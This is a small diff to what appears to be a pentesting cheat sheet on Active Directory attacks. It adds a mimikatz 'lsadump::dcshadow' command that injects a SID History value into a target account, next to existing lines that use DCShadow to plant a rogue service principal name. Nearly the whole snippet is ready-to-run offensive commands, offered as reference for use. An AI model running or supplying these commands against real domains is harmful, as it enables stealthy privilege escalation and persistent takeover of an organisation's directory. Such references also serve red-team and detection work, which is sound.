@@ -876,4 +876,6 @@ Set-DCShadowPermissions -FakeDC corp-user1 -SAMAccountName root1user -Username u
 # Set SPN for user
 lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"
 # Set SID History for user
+lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280565432-1493477821-700767426-345
+# Requires retrieval of current ACL:
 ```
